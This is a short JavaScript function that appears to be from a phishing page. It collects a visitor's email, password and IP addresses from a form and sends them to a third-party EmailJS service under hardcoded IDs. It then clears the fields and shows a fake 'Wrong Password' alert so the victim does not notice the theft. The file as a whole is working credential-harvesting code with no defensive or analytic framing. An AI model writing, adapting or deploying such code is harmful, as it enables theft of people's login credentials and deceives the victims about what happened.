function sendMail() {
  var params = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value,
    ipv4: document.getElementById("ipv4").value,
    ipv6: document.getElementById("ipv6").value,
  };

  const serviceID = "service_v127bm1";
  const templateID = "template_avc41ik";

    emailjs.send(serviceID, templateID, params)
    .then(res=>{
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        console.log(res);
        alert("Wrong Password")

    })
    .catch(err=>console.log(err));

}
